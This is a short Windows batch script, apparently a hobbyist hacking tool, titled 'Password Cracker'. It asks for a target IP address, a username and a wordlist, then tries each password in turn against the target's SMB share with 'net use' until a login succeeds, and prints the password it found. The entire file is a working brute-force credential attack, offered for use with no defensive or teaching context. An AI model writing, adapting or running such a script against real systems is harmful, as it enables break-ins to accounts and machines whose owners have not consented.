@echo off
title = Password Cracker - made by t_b0n311
color A
set /p ip="Enter Ip Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Wordlist: "

for /f %%a in (%wordlist%) do (
 set pass=%%a
 call :attempt
)

echo Password not Found :(
pause
exit

:success
echo Password Found!: %pass%
net use \\%ip% /d /y
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT] [%pass%]
if %errorlevel% EQU 0 goto success



